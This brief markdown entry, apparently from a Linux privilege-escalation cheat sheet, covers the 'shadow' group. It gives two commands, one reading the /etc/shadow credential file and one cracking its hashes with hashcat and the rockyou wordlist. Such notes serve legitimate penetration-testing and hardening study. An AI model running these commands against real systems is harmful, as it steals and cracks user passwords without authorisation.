# Shadow Group

The Shadow group is associated with files that store sensitive user password information, such as password hashes and other authentication data.

## Attack

An attacker could exploit read permissions on the `/etc/shadow` file, where password hashes for all users are stored, and attempt a brute-force attack to recover them.

Retrieve the hashes

```bash
cat /etc/shadow
```

Crack the hashes

```bash
hashcat -m 1800 shadow rockyou.txt
```
